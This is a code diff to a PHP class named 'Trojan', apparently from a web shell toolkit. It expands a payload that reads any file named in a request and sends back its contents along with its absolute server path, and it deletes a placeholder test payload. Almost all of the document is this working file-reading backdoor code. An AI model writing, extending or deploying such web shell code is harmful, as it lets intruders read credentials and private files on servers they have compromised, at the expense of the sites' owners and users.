@@ -197,9 +197,16 @@ class Trojan{
             $this->send_response();
         }
 
-        # echo back the contents of the file
+        # double-up on the output here
+        $output = array(
+            # echo back the contents of the file
+            'output' => file_get_contents($args['file']),
+            # also pass back the absolute path to the file being read
+            'file'   => realpath($args['file']),
+
+        );
         $this->response = array(
-            'output'         => file_get_contents($args['file']),
+            'output'         => $output,
             'prompt_context' => $this->prompt_context,
         );
         $this->send_response();
@@ -290,18 +297,6 @@ class Trojan{
         # if not, provide a notification
         else { echo "The requested file does not exist."; }
         die();
-    }
-    
-    # a simple test payload
-    public function payload_test_payload($args){
-        # assemble a response
-        $this->response = array(
-            //'error'          => 'wash error: This is some error text',
-            'output'         => 'This is the payload output.',
-            'prompt_context' => $this->prompt_context,
-        );
-
-        $this->send_response();
     }
 }
 
